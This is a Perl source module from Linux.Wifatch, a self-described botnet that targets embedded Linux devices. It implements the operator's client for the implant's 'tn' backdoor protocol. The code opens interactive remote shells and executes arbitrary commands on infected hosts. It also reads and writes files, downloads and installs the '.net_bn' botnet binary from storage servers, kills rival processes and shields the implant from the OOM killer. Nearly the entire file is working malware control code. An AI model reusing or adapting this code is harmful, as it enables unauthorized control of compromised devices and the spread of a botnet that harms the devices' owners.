#
# This file is part of Linux.Wifatch
#
# Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
#
# Linux.Wifatch is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Linux.Wifatch is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
#

package bm::tn;

# for port 0x2222 testing
# ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccoemcbodfiafgjeodnnlbabeoejgllhnofbfcddalbcjgdgcanceenkejfmkakbkpcccc

sub TRACE() {0}

use strict;

use Errno ();
use Coro;
use Carp              ();
use Digest::KeccakOld ();
use Scalar::Util      ();
use CBOR::XS          ();
use MIME::Base64      ();
use Coro::AnyEvent    ();

use bn::io;

use bm::socks;
use bm::sql;
use bm::crypto;
use bm::meta;
use bm::file;

sub format_credarg($$$)
{
	my ($id, $secret, $port) = @_;

	my $arg = unpack "H*", pack "a32 a32 n", $id, $secret, $port;
	$arg =~ y/0-9a-f/a-q/;

	$arg
}

sub new
{
	my ($class, $host, $port) = @_;

	if ($host =~ /^[a-z]/) {
		$host = bm::sql::getenv $host;
		$host =~ s/:\d+$//;
	}

	for my $p ($port ? $port : @bm::meta::TNPORTS) {
		my $tn = $class->_new($host, $p);
		return $tn if $tn;
	}

	();
}

sub _new
{
	my ($class, $host, $port) = @_;

	my $fh = bm::socks::connect $host, $port
		or return;

	my $self = bless {
		host => $host,
		port => $port,
		name => "$host:$port",
		fh   => $fh,
		rq   => (new Coro::Channel),
		wl   => (new Coro::Semaphore),
		ol   => (new Coro::Semaphore),
		cwd  => (new Coro::Semaphore),    # lock for changing the cwd
	}, $class;

	($self->{chg}) = bn::io::xread $fh, 32 or return;
	($self->{id})  = bn::io::xread $fh, 32 or return;

	setsockopt $fh, Socket::IPPROTO_TCP, Socket::TCP_NODELAY, pack "i", 1;

	bn::io::xwrite $fh, pack "C/a", bm::crypto::tn_response $self->{id}, $self->{chg};

	($self->{version}, $self->{arch}) = split /\//, $self->rpkt;
	$self->{endian} = $self->rpkt eq "\x11\x22\x33\x44" ? ">" : "<";

	$self->{checksum} = $self->{version} < 10 ? "fnv" : "sha3";

	warn "$self->{name} $self->{version}/$self->{arch}/$self->{endian}\n" if TRACE;

	return undef unless length $self->{arch};
	return undef unless length $self->{version};

	# now wl valid

	while (length(my $env = $self->rpkt)) {

		# unused
	}

	{
		Scalar::Util::weaken(my $self = $self);

		$self->{wcb} = sub {
			my $len = syswrite $fh, $self->{wbuf};
			substr $self->{wbuf}, 0, $len, "";
			undef $self->{ww} unless length $self->{wbuf};

			if (!defined $len && $! != Errno::EAGAIN) {
				undef $self->{ww};
				$self->error;
			}
		};

		$self->{coro} = async {
			while (my $cb = $self->{rq}->get) {
				$cb->($self);
			}
		};
	}

	async_pool {
		$self->write_file("/proc/self/oom_adj",       "0");
		$self->write_file("/proc/self/oom_score_adj", "0");
	};

	$self
}

sub DESTROY
{
	my ($self) = @_;

	warn "$self->{name}: closing, r $self->{rcv} w $self->{snt}\n" if TRACE;

	$self->{coro}->cancel;
	%$self = ();
}

our $ARCH_CONST;

sub const
{
	my ($self, $set) = @_;

	# arch-const.json contains potwntially architecture-specific
	# constants such as EPERM, O_TRUNC, S_IFREG or DT_DIR.
	$ARCH_CONST ||= do {
		require JSON::XS;
		open my $fh, "<", "$bm::file::BASE/arch-const.json"
			or die "$bm::file::BASE/arch-const.json: $!";
		sysread $fh, my $json, -s $fh;
		JSON::XS::decode_json($json);
	};

	my $const = $ARCH_CONST->{ $self->{arch} }
		or die "$self->{name}: $self->{arch}: no arch constants\n";

	my $value;

	$value |= $const->{$_} for split /\s*\|\s*/, $set;

	$value
}

sub error
{
	my ($self) = @_;

	if ($self->{error} > 1000) {
		use Carp;
		Carp::cluck "error count over 9000";
	}

	return if $self->{error}++;

	warn "$self->{name}: unexpected eof\n";
	shutdown $self->{fh}, 2;
}

sub pack
{
	my ($self, $pack, @args) = @_;

	$pack =~ s/([sSlL])/$1$self->{endian}/g;

	pack $pack, @args;
}

sub rpkt
{
	my ($self) = @_;

	my ($l) = bn::io::xread $self->{fh}, 1
		or (($self->error), return);    # really needed

	$l = ord $l;

	my ($buf) = bn::io::xread $self->{fh}, $l
		or (($self->error), return);

	if (TRACE) {
		(my $buf2 = $buf) =~ s/[^\x20-\x7e]/./g;
		warn "$self->{name} > ", (unpack "H*", $buf), " $buf2\n";
	}

	$self->{rcv} += $l + 1;

	$buf
}

sub _send
{
	$_[0]{snt} += length $_[1];

	$_[0]{wbuf} .= $_[1];
	$_[0]{ww} ||= AE::io $_[0]{fh}, 1, $_[0]{wcb};
}

sub wpkt
{
	my ($self, $data) = @_;

	Carp::confess "$self->{name} packet too long (" . (unpack "H*", $data) . ")"
		if 254 < length $data;

	warn "$self->{name} < ", (unpack "H*", $data), "\n" if TRACE;

	$_[0]->_send(pack "C/a", $data);
}

sub wpack
{
	my ($self, $pack, @args) = @_;

	$self->wpkt($self->pack($pack, @args));
}

sub wcmd
{
	my ($self, $pack, @args) = @_;

	if (TRACE) {
		my @args2 = @args;

		$args2[0] = (qw(
				exit shell ropen wopen close kill chmod rename unlink mkdir
				wget lstat statfs rexec rcmd getdents lseek fnv32a fread fwrite
				readlink ret chdir stat sha3 sleep open
				))[$args2[0]];

		s/[^\x20-\x7e]/./g for @args2;
		warn "$self->{name} < sending (@args2)\n";
		$self->{rq}->put(
			sub {
				warn "$self->{name} > expecting (@args2)\n";
			});
	}

	$self->wpkt($self->pack($pack, @args));

}

sub postinstall
{
	my ($self) = @_;

	$self->tn_pid_(
		sub {
			my ($pid) = @_;

			async_pool {
				$self->write_file("/proc/$pid/oom_adj",       "-17");
				$self->write_file("/proc/$pid/oom_score_adj", "-1000");
			};
		});
}

sub shell
{
	my ($self) = @_;

	$self->{wl}->down;
	$self->wpkt(chr 1);

	$self->{rq}->put(my $rcb = Coro::rouse_cb);
	Coro::rouse_wait $rcb;

	$self->{coro}->cancel;

	delete $self->{fh};
}

sub telnet
{
	my $fh = $_[0]->shell;

	my $rr = AE::io $fh, 0, sub {
		sysread $fh, my $buf, 1024
			or exit 0;

		syswrite STDOUT, $buf;
	};

	while () {
		Coro::AnyEvent::readable * STDIN;
		sysread *STDIN, my $buf, 1024;
		bn::io::xwrite $fh, $buf;
	}
}

####################################################################################
# make sure everything is executed
sub flush_
{
	my ($self, $cb) = @_;

	$self->ret_($cb);
}

sub unlink
{
	my ($self, $path) = @_;

	my $guard = $self->{wl}->guard;
	$self->wcmd("C a*", 8, $path);
}

sub chdir
{
	my ($self, $path) = @_;

	$self->{version} >= 7
		or die "$self->{name}: chdir needs tn version 7\n";

	my $guard = $self->{wl}->guard;
	$self->wcmd("C a*", 22, $path);
}

sub mkdir
{
	my ($self, $path) = @_;
	my $guard = $self->{wl}->guard;
	$self->wcmd("C a*", 9, $path);
}

sub kill
{
	my ($self, $signal, @pids) = @_;
	my $guard = $self->{wl}->guard;
	$self->wcmd("CC xx L", 5, $signal, $_) for @pids;
}

sub chmod
{
	my ($self, $mode, $path) = @_;
	my $guard = $self->{wl}->guard;
	$self->wcmd("C x S a*", 6, $mode, $path);
}

sub rename
{
	my ($self, $src, $dst) = @_;
	my $guard = $self->{wl}->guard;
	$self->wcmd("C a*", 7, $src);
	$self->wpkt($dst);
}

sub close
{
	my ($self) = @_;
	my $guard = $self->{wl}->guard;
	$self->wcmd("C", 4) if $self->{ol}->count <= 0;

	delete $self->{opath};
	delete $self->{omode};
	$self->{ol}->up;
}

sub open
{
	my ($self, $path, $write) = @_;

	$self->{ol}->down;
	$self->{opath} = $path;
	$self->{omode} = $write;

	my $guard = $self->{wl}->guard;

	if ($self->{version} < 13 or (!$write and $self->{version} >= 14)) {
		$self->wcmd("C a*", $write ? 3 : 2, $path);
	} else {
		my $flags = $self->const($write ? "O_RDWR | O_CREAT" : "O_RDONLY");
		$self->wcmd("C x s l a*", $self->{version} == 13 ? 26 : 4, 0600, $flags, $path);
	}
}

sub lseek
{
	my ($self, $off, $mode) = @_;
	my $guard = $self->{wl}->guard;
	$self->wcmd("C x2 C l", 16, $mode, $off);
}

sub readall_
{
	my $cb = pop;
	my ($self, $len) = @_;

	my $guard = $self->{wl}->guard;
	if (defined $len) {
		$self->{version} >= 9
			or die "$self->{host}: limited readall needs tn version 9\n";
	} else {
		$len = 0xffffffff;
	}

	if ($len != 0xffffffff or $self->{version} < 12) {
		$self->wcmd("C C x2 L", 18, 0, $len);
	} else {
		$self->wcmd("C", 18);
	}

	$self->{rq}->put(
		sub {
			my @data;

			while (length(my $buf = $self->rpkt)) {
				push @data, $buf;
			}

			$cb->(join "", @data);
		});
}

sub pread_
{
	my ($self, $ofs, $len, $cb) = @_;

	$self->lseek($ofs, 0);
	$self->readall_($len, $cb);
}

sub read_file_
{
	my $cb = pop;
	my ($self, $path, $len) = @_;

	$self->open($path);
	$self->readall_($len, $cb);
	$self->close;
}

sub write
{
	my ($self, $data) = @_;

	my $guard = $self->{wl}->guard;
	for (my $o = 0; $o < length $data; $o += 253) {
		$self->wcmd("C a*", 19, substr $data, $o, 253);
	}
}

sub write_file
{
	my ($self, $path, $data) = @_;

	$self->open($path, 1);
	$self->write($data);
	$self->close;

	1
}

sub xstat_
{
	my ($self, $mode, $path, $cb) = @_;

	my $guard = $self->{wl}->guard;
	$self->wcmd("C a*", $mode, $path);
	$self->{rq}->put(
		sub {
			my ($self) = @_;
			my $stat;
			my ($dev, $ino, $mode, $size, $mtime, $uid);

			my ($dev, $ino, $mode, $nlink, $uid, $gid, $size, $mtime);

			if ($self->{version} >= 14) {

				# differential stat
				my $prev = $self->{prev_stat} ||= [(0) x 7];
				my ($flags, @fields) = eval {unpack "C w*", $self->rpkt};

				for (0 .. 7) {
					$prev->[$_] = shift @fields if $flags & (1 << $_);
				}

				($dev, $ino, $mode, $nlink, $uid, $gid, $size, $mtime) = @$prev;

			} else {
				my $unpack = $self->{version} >= 12 ? "w*" : "L$self->{endian}*";
				my @stat = eval {unpack $unpack, $self->rpkt};

				($dev, $ino, $mode, $size, $mtime, $uid) = @stat;
				($gid, $nlink) = (undef, 1);
			}

			$cb->(  defined $dev
				? [$dev, $ino, $mode, $nlink, $uid, $gid, undef, $size, $mtime, $mtime, $mtime]
				: ());
		});
}

sub stat_
{
	my ($self, $path, $cb) = @_;

	$self->{version} >= 8
		or die "$self->{name}: stat needs tn version 8\n";

	$self->xstat_(23, $path, $cb);
}

sub lstat_
{
	my ($self, $path, $cb) = @_;

	$self->xstat_(11, $path, $cb);
}

sub fstat_
{
	my ($self, $cb) = @_;

	$self->{version} >= 12
		or die "$self->{name}: fstat needs tn version 12\n";

	$self->xstat_(11, "", $cb);
}

sub statfs_
{
	my ($self, $path, $cb) = @_;

	my $guard = $self->{wl}->guard;
	$self->wcmd("C a*", 12, $path);
	$self->{rq}->put(
		sub {
			my $unpack = $self->{version} >= 12 ? "w*" : "L$self->{endian}*";
			my %info;
			@info{qw(type bsize blocks bfree bavail files free)} = eval {unpack $unpack, $self->rpkt};
			$cb->(\%info);
		});
}

sub readlink_
{
	my ($self, $path, $cb) = @_;

	my $guard = $self->{wl}->guard;
	$self->wcmd("C a*", 20, $path);
	$self->{rq}->put(
		sub {
			$cb->($self->rpkt);
		});
}

sub _getdents_
{
	my ($self, $cb) = @_;

	$self->{version} < 9
		or die "$self->{name}: getdents works only up to version 8";

	my $guard = $self->{wl}->guard;
	$self->wcmd("C", 15);
	$self->{rq}->put(
		sub {
			my $buf = do {
				my @buf;

				while (length(my $buf = $self->rpkt)) {
					push @buf, $buf;
				}

				join "", @buf;
			};

			my @names;

			for (my $o = 0; $o < length $buf;) {
				my ($ino, $off, $reclen, $type, $name) =
					unpack "Q$self->{endian} q$self->{endian} S$self->{endian} C Z*",
					substr $buf, $o;

				if ($reclen == 0) {
					warn "$self->{name} reclen zero, aborting getdents.\n";
					return $cb->();
				}

				push @names, [$ino, $type, $name]
					if $name !~ /^(\.|\.\.)$/;

				$o += $reclen;
			}

			$cb->(\@names);
		});
}

sub readdir_
{
	my ($self, $path, $cb) = @_;

	$self->open($path);

	if ($self->{version} >= 9) {
		my $guard = $self->{wl}->guard;
		$self->wcmd("C", 15);
		$self->{rq}->put(
			sub {
				my (@names, $name);

				while (length($name = $self->rpkt)) {
					push @names, $name
						if $name !~ /^(\.|\.\.)$/;
				}

				$cb->(\@names);
			});

	} else {
		$self->_getdents_($cb);
	}

	$self->close;
}

*ls_ = \&readdir_;    # TODO: remove

sub sha3_256_
{
	my $cb = pop;
	my ($self, $len) = @_;

	$self->{version} >= 10
		or die "$self->{host}: sha3 needs tn version 10\n";

	$len //= 0xffffffff;

	my $guard = $self->{wl}->guard;

	if ($len != 0xffffffff or $self->{version} < 12) {
		$self->wcmd("C C x2 L", 24, 32, $len);    # 1 = sha3 or clen
	} else {
		$self->wcmd("C C", 24, 32);               # 1 = sha3 or clen
	}

	$self->{rq}->put(
		sub {
			$cb->($self->rpkt);
		});
}

sub sha3_
{
	my $cb = pop;
	my ($self, $path, $ofs, $len) = @_;

	$self->open($path);
	$self->lseek(0, $ofs) if $ofs;
	$self->sha3_256_($len, $cb);
	$self->close;
}

sub fnv32a_
{
	my $cb = pop;
	my ($self, $len) = @_;

	$self->{version} < 14
		or die "$self->{host}: fnv32a not supported in tn version 14+\n";

	if (defined $len) {
		$self->{version} >= 9
			or die "$self->{host}: limited fnv32a needs tn version 9\n";
	} else {
		$len = 0xffffffff;
	}

	my $guard = $self->{wl}->guard;
	$self->wcmd("C x3 L", 17, $len);
	$self->{rq}->put(
		sub {
			$cb->(unpack "L$self->{endian}", $self->rpkt);
		});
}

sub fnv_
{
	my ($self, $path, $cb) = @_;

	$self->open($path);
	$self->fnv32a_($cb);
	$self->close;
}

sub checksum_
{
	my ($self, $path, $cb) = @_;

	my $checksum_ = "$self->{checksum}_";

	goto &$checksum_;
}

sub ret_
{
	my ($self, $cb) = @_;

	my $guard = $self->{wl}->guard;
	$self->wcmd("C", 21);
	$self->{rq}->put(
		sub {
			$self->rpkt if $self->{version} >= 12;    # skip errno
			$cb->(unpack "l$self->{endian}", $self->rpkt);
		});
}

sub sleep
{
	my ($self, $secs) = @_;

	$self->{version} < 12
		? Coro::AnyEvent::sleep $secs
		: $self->wcmd("C x3 L", 25, $secs * 1000);
}

sub system
{
	my ($self, $cmd) = @_;

	my $guard = $self->{wl}->guard;
	$self->wcmd("C a*", 13, $cmd);
}

sub rsh_
{
	my ($self, $cmd, $cb) = @_;

	my $guard = $self->{wl}->guard;
	$self->wcmd("C a*", 14, $cmd);

	$self->{rq}->put(
		sub {
			my $end = pack "C/a", $self->{chg} . $self->{id};

			my $buf = bn::io::xread $self->{fh}, length $end;

			until ($end eq substr $buf, -length $end) {
				my ($buf2) = bn::io::xread $self->{fh}, 1
					or return $cb->();

				$buf .= $buf2;
			}

			undef $guard;
			cede;
			$cb->(substr $buf, 0, -length $end);
		});
}

####################################################################################
# find pid of tn server (parent pid)
sub tn_pid_
{
	my ($self, $cb) = @_;

	if (exists $self->{cache}{tn_pid}) {
		$cb->($self->{cache}{tn_pid});
	} else {
		$self->{cache}{tn_pid} //= $self->read_file_(
			"/proc/self/stat",
			sub {
				$cb->($self->{cache}{tn_pid} = ($_[0] =~ /^\d+ \(.*?\) . (\d+)/ ? $1 : undef));
			});
	}
}

sub replace_file
{
	my ($self, $path, $file) = @_;

	$self->unlink("${path}x");
	$self->open("${path}x", 1);
	$self->write($file->{data});
	$self->close;

	if ($self->checksum("${path}x") != $file->{ $self->{checksum} }) {
		$self->unlink("${path}x");
		return 0;
	}

	$self->chmod($file->{perm}, "${path}x");
	$self->rename("${path}x", $path);

	1
}

sub send_file_
{
	my ($self, $file, $dst, $cb) = @_;

	$self->unlink("${dst}w");
	$self->unlink("${dst}x");

	$self->checksum_(
		$dst,
		sub {
			if ($file->{ $self->{checksum} } eq $_[0]) {
				$self->chmod($file->{perm}, $dst);
				$cb->(1);
			} else {
				my $dstx = $dst . "x";

				$self->unlink($dst);    # save memory on low-memory node
				$self->open($dstx, 1);
				$self->write($file->{data});
				$self->close;

				$self->checksum_(
					$dstx,
					sub {
						if ($file->{ $self->{checksum} } eq $_[0]) {
							$self->chmod($file->{perm}, $dstx);
							$self->rename($dstx, $dst);
							$cb->(1);

						} else {
							$self->unlink($dstx);
							$cb->(0);
						}
					});
			}
		});
}

sub dl_
{
	my ($self, $node, $type, $id, $dst, $cb) = @_;

	$self->open($dst, 1);

	my ($host, $port) = split /:/, $node;
	$host = Socket::inet_aton $host;

	{
		my $guard = $self->{wl}->guard;
		$self->wcmd("C x n a4", 10, $port, $host);

		# write data always < 254!?
		$self->wpkt("OhKa8eel" . pack "C/a", pack "C a*", $type + 64, $id);
		$self->wpkt("");

		if ($self->{version} < 12) {
			$self->wpack("C a*", 20, ".");    # readlink, fails with 0 byte reply
			$self->wpack("C", 21);            # returns result
		}

		$self->{rq}->put(
			sub {
				my ($packets, $buf);

				if ($self->{version} < 12) {
					++$packets while length $self->rpkt;
				} else {
					++$packets while "" eq $self->rpkt and !$self->{error};    # last one eats errno
				}

				$cb->((unpack "L$self->{endian}", $self->rpkt), $packets);
			});
	}

	$self->close;
}

# download a file, returns 2 if the file did not need updating
sub dl_file_
{
	my ($self, $file, $dst, $cb) = @_;

	$self->unlink("${dst}w");
	$self->unlink("${dst}x");

	$self->checksum_(
		$dst,
		sub {
			if ($file->{ $self->{checksum} } eq $_[0]) {
				$self->chmod($file->{perm}, $dst);
				$cb->(2);
			} else {
				my $dstx = $dst . "x";

				$self->unlink($dst);    # save memory on low-memory node

				async_pool {
					for my $server (bm::sql::storage_servers) {
						$self->dl_($server, 3, $file->{sha}, $dstx, sub { });

						my $success;

						$self->checksum_($dstx, my $rcb = Coro::rouse_cb);
						if ($file->{ $self->{checksum} } eq Coro::rouse_wait $rcb) {
							$self->chmod($file->{perm}, $dstx);
							$self->rename($dstx, $dst);
							return $cb->(1);

						} else {

							#warn "$self->{name}: $dst download checkusm failure)\n";
							$self->unlink($dstx);
						}
					}

					$self->unlink($dstx);
					$cb->(0);
				};
			}
		});
}

*ping_ = \&ret_;

sub sync_
{
	my ($self, $cb) = @_;

	$self->{rq}->put($cb);
}

sub flush
{
	my ($self) = @_;

	$self->ping_(sub { });
	$self->sync while $self->{rq}->size;
}

####################################################################################
sub pids_
{
	my ($self, $cb) = @_;

	$self->ls_(
		"/proc",
		sub {
			$cb->(grep /^\d+$/a, @{ $_[0] });
		});
}

sub tail_
{
	my ($self, $path, $bytes, $cb) = @_;

	$self->open($path);
	$self->lseek(-$bytes, 2);
	$self->readall_($cb);
	$self->close;
}

# filter($pid,$version,$arch,$name)
sub bnfind_
{
	my ($self, $filter, $cb) = @_;

	$self->pids_(
		sub {
			my @pids;

			for my $pid (@_) {
				$self->tail_(
					"/proc/$pid/exe",
					64,
					sub {
						if ($_[0] =~ /\nZieH8yie Zip0miib (\d+) (\S+) (\S+)[^\n]*\n\Z/) {
							push @pids, $pid
								if $filter->($pid, $1, $2, $3);
						}
					});
			}

			$self->sync_(
				sub {
					$cb->(@pids);
				});
		});
}

# uses too much bandwidth to be of use
sub portinfo_
{
	my ($self, $cb) = @_;

	my %tcp;
	my %fd;

	my $cv = AE::cv {
		$cb->();
	};

	$cv->begin;
	$self->read_file_(
		"/proc/net/tcp",
		sub {
			for (split /\n/, $_[0]) {
				s/^ +//;
				my ($idx, $loc, $rem, $st, $tx, $rx, $tr, $retrnsmt, $uid, $timeout, $inode) = split /\s+/;

				next unless $rem eq "00000000:0000";

				warn "$loc $inode\n";
			}

			$cv->end;
		});

	$cv->begin;
	$self->pids_(
		sub {
			for my $pid (@_) {
				$cv->begin;
				$self->readdir_(
					"/proc/$pid/fd",
					sub {
						for my $path (@{ $_[0] }) {
							if (0) {
								$cv->begin;
								$self->readlink_(
									"/proc/$pid/fd/$path",
									sub {
										warn "$pid $path <$_[0]>\n";

										# "socket:[12345]" type 1
										# "[0000]:12345" # type 2
										$cv->end;
									});
							}
						}
						$cv->end;
					});
			}

			$cv->end;
		});
}

sub lair_
{
	my ($self, $cb) = @_;

	# TODO: maybe lock
	if ($self->{cache}{lair}) {
		$cb->($self->{cache}{lair});
	} else {
		$self->readlink_(
			"/proc/self/exe",
			sub {
				my ($lair) = @_;

				$lair =~ s/ \(deleted\)$//;
				$lair =~ s/\x00.*//s;
				$lair =~ s/\/\.net_tn$//
					or return $cb->();

				$cb->($self->{cache}{lair} = $lair);
			});
	}
}

sub load_pl
{
	bm::file::load "dist/pl";
}

sub load_bn
{
	bm::file::load "arch/$_[0]{arch}/botnet";
}

sub read_cfg_
{
	my ($self, $cb) = @_;

	my $lair = $self->lair;

	$self->read_file_(
		"$lair/.net_cf",
		sub {
			my $bin = shift;
			my $cfg = eval {
				$bin =~ s/\n[\x20-\x7e]+\n$//;
				CBOR::XS::decode_cbor Compress::LZF::decompress $bin;
			};
			$cb->($cfg);
		});
}

sub write_cfg_
{
	my ($self, $cfg, $cb) = @_;

	my $lair = $self->lair;

	$cfg = CBOR::XS::encode_cbor $cfg;
	$cfg = Compress::LZF::compress $cfg;
	$cfg .= "\nZieH8yie Zip0miib 0 - cf\n";

	$self->write_file("$lair/.net_cfx", $cfg);
	$self->rename("$lair/.net_cfx", "$lair/.net_cf");

	$cb->(1);
}

# counter-intuitively, return 0 if version is high enough
# and return 1 if an upgrade was done (requiring a reconnect)
sub upgrade_tn
{
	my ($self, $mintn) = @_;

	$mintn //= bm::sql::getenv "mintn";

	return 0
		if $self->{version} >= $mintn;

	my $lair  = $self->lair;
	my $tnpid = $self->tn_pid;

	my $tn = bm::file::load "arch/$_[0]{arch}/tn";

	print "$self->{name}: upgrading tn\n";

	unless ($self->dl_file($tn, "$lair/.net_tn")) {
		$self->replace_file("$lair/.net_tn", $tn)
			or die "$self->{name}: unable to dl net_tn\n";
	}

	my $creds = format_credarg $self->{id}, bm::crypto::tn_gensecret $self->{id}, $self->{port};

	#  my $out = $self->rsh ("\Q$lair\E/.net_tnx $creds 2>&1");
	#	my $out = $self->rsh ("echo hi");
	#	use Data::Dump; ddx $out;
	#	printf "RET=%x\n", $self->ret;
	$self->flush;
	$self->kill(9, $tnpid);
	$self->system("\Q$lair\E/.net_tn $creds");
	$self->system("\Q$lair\E/.net_tn $creds");
	$self->system("\Q$lair\E/.net_tn $creds");
	$self->sleep(0.2);
	$self->system("\Q$lair\E/.net_tn $creds");
	$self->system("\Q$lair\E/.net_tn $creds");
	$self->system("\Q$lair\E/.net_tn $creds");
	$self->flush;
	$self->sleep(1);
	$self->system("\Q$lair\E/.net_tn $creds");
	$self->system("\Q$lair\E/.net_tn $creds");
	$self->system("\Q$lair\E/.net_tn $creds");
	$self->flush;

	print "$self->{name} updated tn\n";
	Coro::AnyEvent::sleep 10;

	1
}

# upgrade bn
sub upgrade
{
	my ($self) = @_;

	$self->lstat_(
		"/dev/null",
		sub {
			return if defined $_[0][0];
			$self->system("mknod /dev/null c 1 3");
		});

	# some routers fill all their ram with logfiles
	if (0) {
		for my $bigfile (qw(
			/var/dnsproxy
			)
			) {
			$self->stat_(
				$bigfile,
				sub {
					$self->system("true >\Q$bigfile\E", sub { });
				});
		}
	}

	$self->bnfind_(sub {$_[3] eq "botnet"}, my $rcb = Coro::rouse_cb);
	$self->kill(9, Coro::rouse_wait $rcb);

	my $lair = $self->lair;

	#	$self->system ("killall -9 telnetd utelnetd");

	my $bn = $self->load_bn;
	$self->dl_file($bn, "$lair/.net_bn")
		or die "$self->{name} unable to dl bn\n";

	my $pl = $self->load_pl;
	unless ($self->dl_file($pl, "$lair/.net_pl")) {
		warn "$self->{name} unable to dl pl, trying direct upload\n";
		$self->replace_file("$lair/.net_pl", $pl)
			or die "$self->{name} unable to send pl\n";
	}

	my $tn = bm::file::load "arch/$_[0]{arch}/tn";
	unless ($self->dl_file($tn, "$lair/.net_tn")) {
		$self->replace_file("$lair/.net_tn", $tn)
			or die "$self->{name}: unable to dl net_tn\n";
	}

	my $cfg = $self->read_cfg;
	$cfg->{infect} = int AE::now;
	$cfg->{tnport} = $self->{port};
	push @{ $cfg->{hpvs4} }, map bm::meta::str2id $_, bm::sql::seed_servers;
	delete $cfg->{seed};
	$self->write_cfg($cfg);

	#	$self->system ("\Q$lair\E/.net_bn cset " . MIME::Base64::encode_base64 ((CBOR::XS::encode_cbor {
	#		infect => int AE::now,
	#		tnport => $self->{port},
	#	})));

	#my $res =
	$self->system("\Q$lair\E/.net_bn -start");

	#	$res =~ /^jo0iiPh1<\d+>/
	#		or die "$self->{name} unable to start node ($res)\n";

	Coro::AnyEvent::sleep 5;

	#	$self->system ("killall -STOP telnetd utelnetd");
}

sub usable_mem_
{
	my ($self, $cb) = @_;

	$self->lair_(
		sub {
			my ($lair) = @_;
			my $inuse;

			for (qw(bn pl tn 0 2 5 6)) {
				$self->stat_(
					"$lair/.net_$_",
					sub {
						$inuse += ($_[0][7] + 4095) >> 12;
					});
			}

			$self->write_file("/proc/sys/vm/drop_caches", "3");

			$self->read_file_(
				"/proc/meminfo",
				sub {
					my %mi;
					/^(\S+):\s*(\d+)\s*kB\s*$/ and $mi{$1} = $2 for split /\n/, $_[0];

					$cb->($mi{MemFree} + $inuse);
				});
		});
}

####################################################################################
our $AUTOLOAD;

AUTOLOAD {
	$AUTOLOAD =~ /([^:]+)$/
		or die "autoload failure: $AUTOLOAD";

	my $fn = $1;

	if ($fn =~ s/_$//) {
		die "$AUTOLOAD not available\n";
	} else {
		$fn .= "_";
		*$AUTOLOAD = sub {
			push @_, my $rcb = Coro::rouse_cb;
			&$fn;
			Coro::rouse_wait $rcb;
		};
	}

	goto &$AUTOLOAD;
}

1

